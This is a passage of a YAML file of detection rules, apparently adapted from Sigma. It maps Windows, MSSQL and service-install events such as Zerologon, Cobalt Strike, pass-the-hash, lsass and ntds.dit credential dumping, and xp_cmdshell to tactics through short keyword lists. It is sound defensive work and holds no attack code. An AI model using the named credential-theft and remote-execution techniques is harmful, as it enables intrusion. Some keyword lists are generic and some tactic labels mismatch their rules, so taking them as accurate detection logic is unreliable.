  conditions:
    summary:
      regex_any:
      - crash
      - dump
      - created
      - operating
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18f37338_b9bd_4117_a039_280c81f7a596
  intent: lateral_movement
  tactic: lateral_movement
  description: This rule is designed to detect attempts to exploit Zerologon (CVE-2020-1472)
    vulnerability using mimikatz zerologon module or other exploits from machine with
    "kali" hostname.
  conditions:
    summary:
      regex_any:
      - zerologon
      - exploitation
      - using
      - well
      - known
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0cb7110_edf0_47a4_9177_541a4083128a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects that a vulnerable Netlogon secure channel connection was allowed,
    which could be an indicator of CVE-2020-1472.
  conditions:
    summary:
      regex_any:
      - vulnerable
      - netlogon
      - secure
      - channel
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f14719ce_d3ab_4e25_9ce6_2899092260b0
  intent: impact_operations
  tactic: impact
  description: This the exploitation of a NTFS vulnerability as reported without many
    details via Twitter
  conditions:
    summary:
      regex_any:
      - ntfs
      - vulnerability
      - exploitation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a105d34_05fc_401e_8553_272b45c1522d
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects known malicious service installs that appear in cases in which
    a Cobalt Strike beacon elevates privileges or lateral movement
  conditions:
    summary:
      regex_any:
      - cobaltstrike
      - service
      - installations
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c0a7755_6d31_44fa_80e1_133e57752680
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when the "Windows Defender Threat Protection" service is disabled.
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - threat
      - detection
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52a85084_6989_40c3_8f32_091e12e13f09
  intent: execution
  tactic: execution
  description: Detects the use of smbexec.py tool by detecting a specific service
    installation
  conditions:
    summary:
      regex_any:
      - smbexec
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7385ee2_0e0c_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - launcher
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_51aa9387_1c53_4153_91cc_d73c59ae1ca9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the code block linked in the references
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - obfuscated
      - invocation
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_72862bf2_0eb1_11eb_adc1_0242ac120002
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of stdin to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - launcher
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ca7004b_e620_4ecb_870e_86129b5b8e75
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_175997c5_803c_4b08_8bb0_70b099f47595
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - compress
      - obfuscation
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_11b52f18_aaec_4d60_9143_5dd8cc4706b9
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll
      - launcher
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_487c7524_f892_4054_b263_8a0ace63fc25
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via Stdin in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_63e3365d_4824_42d8_8b82_e56810fefa0c
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7e9c7999_0f9b_4d4a_a6ed_af6d553d4af4
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - mshta
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_641a4bfb_c017_44f7_800c_2aee0184ce9b
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll32
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_14bcba49_a428_42d9_b943_e2ce0f0f7ae6
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - obfuscation
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e97d9903_53b2_41fc_8cb9_889ed4093e80
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects service creation from KrbRelayUp tool used for privilege escalation
    in Windows domain environments where LDAP signing is not enforced (the default
    settings)
  conditions:
    summary:
      regex_any:
      - krbrelayup
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4976aa50_8f41_45c6_8b15_ab3fc10e79ed
  intent: unknown
  tactic: s0005
  description: Detects well-known credential dumping tools execution via service execution
    events
  conditions:
    summary:
      regex_any:
      - credential
      - dumping
      - tools
      - service
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_843544a7_56e0_4dcc_a44f_5cc266dd97d6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting
    a specific service installation
  conditions:
    summary:
      regex_any:
      - meterpreter
      - cobalt
      - strike
      - getsystem
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_25b9c01c_350d_4b95_bed1_836d04a4f324
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the use of Moriya rootkit as described in the securelist's
    Operation TunnelSnake report
  conditions:
    summary:
      regex_any:
      - moriya
      - rootkit
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2e5019d_a658_4c6a_92bf_7197b54e2cae
  intent: execution
  tactic: execution
  description: Detects powershell script installed as a Service
  conditions:
    summary:
      regex_any:
      - powershell
      - scripts
      - installed
      - services
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_530a6faa_ff3d_4022_b315_50828e77eef5
  intent: persistence_installation
  tactic: persistence
  description: Detects the installation of the anydesk software service. Which could
    be an indication of anydesk abuse if you the software isn't already used.
  conditions:
    summary:
      regex_any:
      - anydesk
      - remote
      - access
      - software
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a27e5fa9_c35e_4e3d_b7e0_1ce2af66ad12
  intent: execution
  tactic: execution
  description: Detects CSExec service installation and execution events
  conditions:
    summary:
      regex_any:
      - csexec
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d26ce60c_2151_403c_9a42_49420d87b5e4
  intent: unknown
  tactic: s0029
  description: Detects installation or execution of services
  conditions:
    summary:
      regex_any:
      - hacktool
      - service
      - registration
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0d1ad53_c7eb_48ec_a87a_72393cc6cedc
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a Mesh Agent service installation. Mesh Agent is used to remotely
    manage computers
  conditions:
    summary:
      regex_any:
      - mesh
      - agent
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d510d8d_912b_45c5_b1df_36faa3d8c3f4
  intent: persistence_installation
  tactic: persistence
  description: Detects NetSupport Manager service installation on the target system.
  conditions:
    summary:
      regex_any:
      - netsupport
      - manager
      - service
      - install
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_de7ce410_b3fb_4e8a_b38c_3b999e2c3420
  intent: execution
  tactic: execution
  description: Detects PAExec service installation
  conditions:
    summary:
      regex_any:
      - paexec
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee9ca27c_9bd7_4cee_9b01_6e906be7cae3
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects a PDQDeploy service installation which indicates that PDQDeploy
    was installed on the machines.

    PDQDeploy can be abused by attackers to remotely install packages or execute commands
    on target machines

    '
  conditions:
    summary:
      regex_any:
      - pdqdeploy
      - service
      - server
      - side
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b98a10af_1e1e_44a7_bab2_4cc026917648
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects PDQDeploy service installation on the target system.

    When a package is deployed via PDQDeploy it installs a remote service on the target
    machine with the name "PDQDeployRunner-X" where "X" is an integer starting from
    1

    '
  conditions:
    summary:
      regex_any:
      - pdqdeploy
      - service
      - client
      - side
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4ff1eac_84ad_44dd_a6fb_d56a92fc43a9
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a ProcessHacker tool that elevated privileges to a very high
    level
  conditions:
    summary:
      regex_any:
      - processhacker
      - privilege
      - elevation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e36ed87_4986_482e_8e3b_5c23ffff11bf
  intent: execution
  tactic: execution
  description: Detects RemCom service installation and execution events
  conditions:
    summary:
      regex_any:
      - remcom
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a31b18a_f00c_4061_9900_f735b96c99fc
  intent: execution
  tactic: execution
  description: Detects service installation of different remote access tools software.
    These software are often abused by threat actors to perform
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - services
      - have
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85cce894_dd8b_4427_a958_5cc47a4dc9b9
  intent: persistence_installation
  tactic: persistence
  description: Detects Remote Utilities Host service installation on the target system.
  conditions:
    summary:
      regex_any:
      - remote
      - utilities
      - host
      - service
      - install
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_31c51af6_e7aa_4da7_84d4_8f32cc580af2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects known malicious service installation that appear in cases in
    which a Sliver implants execute the PsExec commands
  conditions:
    summary:
      regex_any:
      - sliver
      - default
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_71c276aa_49cd_43d2_b920_2dcd3e6962d5
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a service installed by a client which has PID 0 or whose parent
    has PID 0
  conditions:
    summary:
      regex_any:
      - service
      - installed
      - unusual
      - client
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1d61f71d_59d2_479e_9562_4ff5f4ead16b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious service installation commands
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42c575ea_e41e_41f1_b248_8093c3e82a28
  intent: unknown
  tactic: s0029
  description: Detects PsExec service installation and execution events
  conditions:
    summary:
      regex_any:
      - psexec
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4bb79b62_ef12_4861_981d_2aab43fab642
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a TacticalRMM service installation. Tactical RMM is a remote
    monitoring & management tool.
  conditions:
    summary:
      regex_any:
      - tacticalrmm
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8e4cf0e5_aa5d_4dc3_beff_dc26917744a9
  intent: data_exfiltration
  tactic: exfiltration
  description: Well-known TAP software installation. Possible preparation for data
    exfiltration using tunnelling techniques
  conditions:
    summary:
      regex_any:
      - driver
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_26481afe_db26_4228_b264_25a29fe6efc7
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects uncommon service installation commands by looking at suspicious
    or uncommon image path values containing references to encoded powershell commands,
    temporary paths, etc.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - service
      - installation
      - image
      - path
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d6b5520d_3934_48b4_928c_2aa3f92d6963
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects important or interesting Windows services that got terminated
    for whatever reason
  conditions:
    summary:
      regex_any:
      - important
      - windows
      - service
      - terminated
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56abae0c_6212_4b97_adc0_0b559bb950c3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects important or interesting Windows services that got terminated
    unexpectedly.
  conditions:
    summary:
      regex_any:
      - important
      - windows
      - service
      - terminated
      - unexpectedly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91c49341_e2ef_40c0_ac45_49ec5c3fe26c
  intent: persistence_installation
  tactic: persistence
  description: Detects the installation of RTCore service. Which could be an indication
    of Micro-Star MSI Afterburner vulnerable driver abuse
  conditions:
    summary:
      regex_any:
      - rtcore
      - suspicious
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5e993621_67d4_488a_b9ae_b420d08b96cb
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects service installation in suspicious folder appdata
  conditions:
    summary:
      regex_any:
      - service
      - installation
      - suspicious
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1b2ae822_6fe1_43ba_aa7c_d1a3b3d1d5f2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects service installation with suspicious folder patterns
  conditions:
    summary:
      regex_any:
      - service
      - installation
      - with
      - suspicious
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70f00d10_60b2_4f34_b9a0_dc3df3fe762a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious service installation scripts
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - installation
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aaa5b30d_f418_420b_83a0_299cb6024885
  intent: lateral_movement
  tactic: lateral_movement
  description: Detect suspicious error on protocol RDP, potential CVE-2019-0708
  conditions:
    summary:
      regex_any:
      - potential
      - exploit
      - '2019'
      - 0708
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d91f6e4_9f3b_4c21_ae41_2c5b7d9f7a12
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects SMB server connections to shares without signing or encryption
    enabled.

    This could indicate potential lateral movement activity using unsecured SMB shares.

    '
  conditions:
    summary:
      regex_any:
      - unsigned
      - unencrypted
      - connection
      - share
      - established
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_71886b70_d7b4_4dbf_acce_87d2ca135262
  intent: credential_harvesting
  tactic: credential_access
  description: Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution
    in Windows Spooler Service
  conditions:
    summary:
      regex_any:
      - suspicious
      - rejected
      - guest
      - logon
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02f7c9c1_1ae8_4c6a_8add_04693807f92f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential token impersonation and theft. Example, when using
    "DuplicateToken(Ex)" and "ImpersonateLoggedOnUser" with the "LOGON32_LOGON_NEW_CREDENTIALS
    flag".
  conditions:
    summary:
      regex_any:
      - potential
      - access
      - token
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2111118f_7e46_4fc8_974a_59fd8ec95196
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the default "UserName" used by the DiagTrackEoP POC
  conditions:
    summary:
      regex_any:
      - diagtrackeop
      - default
      - login
      - username
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_192a0330_c20b_4356_90b6_7b7049ae0b87
  intent: unknown
  tactic: s0002
  description: Detects successful logon with logon type 9 (NewCredentials) which matches
    the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.
  conditions:
    summary:
      regex_any:
      - successful
      - overpass
      - hash
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8eef149c_bd26_49f2_9e5a_9b00e3af499b
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the attack technique pass the hash which is used to move laterally
    inside the network
  conditions:
    summary:
      regex_any:
      - pass
      - hash
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8400629e_79a9_4737_b387_5db940ab2367
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable
    to  CVE-2019-0708 RDP RCE aka BlueKeep
  conditions:
    summary:
      regex_any:
      - scanner
      - '2019'
      - 0708
      - vuln
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_51e33403_2a37_4d66_a574_1fda1782cc31
  intent: lateral_movement
  tactic: lateral_movement
  description: RDP login with localhost source address may be a tunnelled login
  conditions:
    summary:
      regex_any:
      - login
      - from
      - localhost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_259a9cdf_c4dd_4fa2_b243_2269e5ab18a2
  intent: credential_harvesting
  tactic: credential_access
  description: Detects successful logon from public IP address via RDP. This can indicate
    a publicly-exposed RDP port.
  conditions:
    summary:
      regex_any:
      - external
      - remote
      - logon
      - from
      - public
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_78d5cab4_557e_454f_9fb9_a222bd0d5edc
  intent: credential_harvesting
  tactic: credential_access
  description: Detects successful logon from public IP address via SMB. This can indicate
    a publicly-exposed SMB port.
  conditions:
    summary:
      regex_any:
      - external
      - remote
      - logon
      - from
      - public
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f88e112a_21aa_44bd_9b01_6ee2a2bbbed1
  intent: persistence_installation
  tactic: persistence
  description: Detects a failed logon attempt from a public IP. A login from a public
    IP can indicate a misconfigured firewall or network boundary.
  conditions:
    summary:
      regex_any:
      - failed
      - logon
      - from
      - public
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_749c9f5e_b353_4b90_a9c1_05243357ca4b
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects a suspicious local successful logon event where the Logon
    Package is Kerberos, the remote address is set to localhost, and the target user
    SID is the built-in local Administrator account.

    This may indicate an attempt to leverage a Kerberos relay attack variant that
    can be used to elevate privilege locally from a domain joined limited user to
    local System privileges.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - privilege
      - escalation
      - local
      - kerberos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16f5d8ca_44bd_47c8_acbe_6fc95a16c12f
  intent: credential_harvesting
  tactic: credential_access
  description: Detects logon events that have characteristics of events generated
    during an attack with RottenPotato and the like
  conditions:
    summary:
      regex_any:
      - rottenpotato
      - like
      - attack
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bacf58c6_e199_4040_a94f_95dea0f1e45a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a Windows Filtering Platform (WFP) blocked connection event
    involving common Endpoint Detection and Response (EDR) agents.

    Adversaries may use WFP filters to prevent Endpoint Detection and Response (EDR)
    agents from reporting security events.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - filtering
      - platform
      - blocked
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_50cb47b8_2c33_4b23_a2e9_4600657d9746
  intent: execution
  tactic: execution
  description: Detects loading of diagcab packages from a remote path, as seen in
    DogWalk vulnerability
  conditions:
    summary:
      regex_any:
      - loading
      - diagcab
      - package
      - from
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_545a5da6_f103_4919_a519_e9aec1026ee4
  intent: defense_evasion
  tactic: defense_evasion
  description: This rule detects a suspicious crash of the Microsoft Malware Protection
    Engine
  conditions:
    summary:
      regex_any:
      - microsoft
      - malware
      - protection
      - engine
      - crash
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a18e0862_127b_43ca_be12_1a542c75c7c5
  intent: credential_harvesting
  tactic: credential_access
  description: Detects Windows error reporting event where the process that crashed
    is lsass. This could be the cause of an intentional crash by techniques such as
    Lsass-Shtinkering to dump credential
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6e88853_5f20_4c4a_8d26_cd469fd8d31f
  intent: credential_harvesting
  tactic: credential_access
  description: Detects potential abuse of ntdsutil to dump ntds.dit database
  conditions:
    summary:
      regex_any:
      - ntdsutil
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_94dc4390_6b7c_4784_8ffc_335334404650
  intent: execution
  tactic: execution
  description: Detects potential abuse of ntdsutil to dump ntds.dit database to a
    suspicious location
  conditions:
    summary:
      regex_any:
      - dump
      - ntds
      - suspicious
      - location
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48d91a3a_2363_43ba_a456_ca71ac3da5c2
  intent: impact_operations
  tactic: impact
  description: 'Detects events generated by user-mode applications when they call
    the CveEventWrite API when a known vulnerability is trying to be exploited.

    MS started using this log in Jan. 2020 with CVE-2020-0601 (a Windows CryptoAPI
    vulnerability.

    Unfortunately, that is about the only instance of CVEs being written to this log.

    '
  conditions:
    summary:
      regex_any:
      - audit
      - event
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9703792d_fd9a_456d_a672_ff92efe4806a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects backup catalog deletions
  conditions:
    summary:
      regex_any:
      - backup
      - catalog
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b4c8da4a_1c12_46b0_8a2b_0a8521d03442
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects restricted access to applications by the Software Restriction
    Policies (SRP) policy
  conditions:
    summary:
      regex_any:
      - restricted
      - software
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7c8aa1c_5aff_408e_828b_998e3620b341
  intent: execution
  tactic: execution
  description: Detects MSI package installation from suspicious locations
  conditions:
    summary:
      regex_any:
      - installation
      - from
      - suspicious
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5594e67a_7f92_4a04_b65d_1a42fd824a60
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects installation of a remote msi file from web.
  conditions:
    summary:
      regex_any:
      - installation
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_87261fb2_69d0_42fe_b9de_88c6b5f65a43
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects successful installation of Atera Remote Monitoring & Management
    (RMM) agent as recently found to be used by Conti operators
  conditions:
    summary:
      regex_any:
      - atera
      - agent
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_08200f85_2678_463e_9c32_88dce2f073d1
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker tries to backdoor the MSSQL server by adding
    a backdoor account to the sysadmin fixed server role
  conditions:
    summary:
      regex_any:
      - mssql
      - account
      - sysadmin
      - role
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_00321fee_ca72_4cce_b011_5415af3b9960
  intent: impact_operations
  tactic: impact
  description: 'Detects the invocation of MS SQL transactions that are destructive
    towards table or database data, such as "DROP TABLE" or "DROP DATABASE".

    '
  conditions:
    summary:
      regex_any:
      - mssql
      - destructive
      - query
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_350dfb37_3706_4cdc_9e2e_5e24bc3a46df
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an attacker calls the "ALTER SERVER AUDIT" or "DROP SERVER
    AUDIT" transaction in order to delete or disable audit logs on the server
  conditions:
    summary:
      regex_any:
      - mssql
      - disable
      - audit
      - settings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ebfe73c2_5bc9_4ed9_aaa8_8b54b2b4777d
  intent: credential_harvesting
  tactic: credential_access
  description: Detects failed logon attempts from clients with external network IP
    to an MSSQL server. This can be a sign of a bruteforce attack.
  conditions:
    summary:
      regex_any:
      - mssql
      - server
      - failed
      - logon
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3d57a5c_c92e_4b48_9a79_5f124b7cf964
  intent: persistence_installation
  tactic: persistence
  description: Detects when the a stored procedure is set or cleared for automatic
    execution in MSSQL. A stored procedure that is set to automatic execution runs
    every time an instance of SQL Server is started
  conditions:
    summary:
      regex_any:
      - mssql
      - spprocoption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f103213_a04e_4d59_8261_213dddf22314
  intent: execution
  tactic: execution
  description: Detects when the MSSQL "xp_cmdshell" stored procedure is used to execute
    commands
  conditions:
    summary:
      regex_any:
      - mssql
      - xpcmdshell
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d08dd86f_681e_4a00_a92c_1db218754417
  intent: execution
  tactic: execution
  description: 'Detects when the MSSQL "xp_cmdshell" stored procedure setting is changed.

    '
  conditions:
    summary:
      regex_any:
      - mssql
      - xpcmdshell
      - option
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_78bc5783_81d9_4d73_ac97_59f6db4f72a8
  intent: unknown
  tactic: resource_development
  description: 'Detects potentially highly relevant antivirus events in the application
    log based on known virus signature names and malware keywords.

    '
  conditions:
    summary:
      regex_any:
      - relevant
      - anti
      - virus
      - signature
      - keywords
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c82cf5c_090d_4d57_9188_533577631108
  intent: defense_evasion
  tactic: defense_evasion
  description: This rule detects a suspicious crash of the Microsoft Malware Protection
    Engine
  conditions:
    summary:
      regex_any:
      - microsoft
      - malware
      - protection
      - engine
      - crash
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e09aed7a_09e0_4c9a_90dd_f0d52507347e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects WebDav DownloadCradle
  conditions:
    summary:
      regex_any:
      - windows
      - webdav
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_195c1119_ef07_4909_bb12_e66f5e07bf3c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects download of certain file types from hosts with dynamic DNS
    names (selected list)
  conditions:
    summary:
      regex_any:
      - download
      - from
      - suspicious
      - dyndns
      - hosts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b59c98c6_95e8_4d65_93ee_f594dfb96b17
  intent: unknown
  tactic: initial_access
  description: Detects POST requests to the F5 BIG-IP iControl Rest API "bash" endpoint,
